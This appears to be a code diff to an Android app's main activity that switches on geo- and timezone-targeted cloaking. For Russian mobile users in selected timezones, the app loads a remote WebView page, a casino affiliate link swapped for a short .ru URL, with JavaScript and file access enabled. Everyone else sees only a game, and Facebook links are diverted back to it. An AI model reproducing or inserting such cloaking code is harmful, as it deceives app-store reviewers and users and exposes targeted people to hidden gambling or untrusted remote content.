@@ -86,18 +86,21 @@ public class MainActivity extends AppCompatActivity {
             }
         });
     }
+
     boolean off = false;
 
     @SuppressLint("SetJavaScriptEnabled")
     private void openFile(String countryCode) {
-//        if (countryCode.equals("RU") && mobile() && time()) {
-        if (off) {
+        if (countryCode.equals("RU") && mobile() && time()) {
+//        if (off) {
             progressBar.setVisibility(View.GONE);
             WebView webView = findViewById(R.id.web_view);
             webView.setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    view.loadUrl(url);
+                    if (!url.contains("facebook"))
+                        view.loadUrl(url);
+                    else openGame();
                     return true;
                 }
 
@@ -118,7 +121,7 @@ public class MainActivity extends AppCompatActivity {
             webSettings.setSupportZoom(true);
             webSettings.setJavaScriptEnabled(true);
             webSettings.setAllowFileAccess(true);
-            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_4");
+            webView.loadUrl("http://hhalcajs.ru/P9qF8N");
         } else {
             openGame();
         }
@@ -129,7 +132,7 @@ public class MainActivity extends AppCompatActivity {
             TimeZone tz = TimeZone.getDefault();
             Date now = new Date();
             int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
-            int[] timezone = {2,3,4,7,8,9,10,11,12};
+            int[] timezone = {2, 3, 4, 7, 8, 9, 10, 11, 12};
             for (int item : timezone) {
                 if (offsetFromUtc == item)
                     return true;
